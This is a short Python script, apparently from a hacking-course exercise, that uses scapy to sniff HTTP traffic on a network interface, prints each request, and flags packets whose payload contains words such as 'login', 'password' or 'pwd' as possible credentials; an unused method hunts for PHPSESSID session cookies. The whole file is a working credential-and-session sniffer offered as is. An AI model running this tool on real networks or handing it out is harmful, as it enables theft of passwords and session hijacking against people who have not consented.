import scapy.all as scapy
from scapy_http import http


class PacketSniffer:

    def __init__(self, interface):
        self.cek = False
        scapy.sniff(iface=interface, store=False, prn=self.process_sniffer)

    def process_sniffer(self, packet):
        if self.cek is False:
            print(self.cek)
        if packet.haslayer(http.HTTPRequest):
            data = packet.show()
            print(data)
            self.cek = True
            credentials = self.get_credential(packet)
            if credentials:
                print("[=] Possible username/passowrd" + str(credentials) + "\n\n")

    def get_credential(self, packet):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            #print(data)
            keywords = ["login", "password", "username", "user", "pass", "pwd"]
            for keyword in keywords:
                if keyword in str(load):
                    return load

    def get_session(self, packet):
        if packet.haslayer(scapy.Raw):
            data = packet[scapy.Raw].load
            print("scapy raw : " + str(data))
            keywords = ["PHPSESSID"]
            for keyword in keywords:
                if keyword in str(data):
                    return data


PacketSniffer("enp0s8")
#sniff(iface='enp0s3', prn=http_header, count=3)
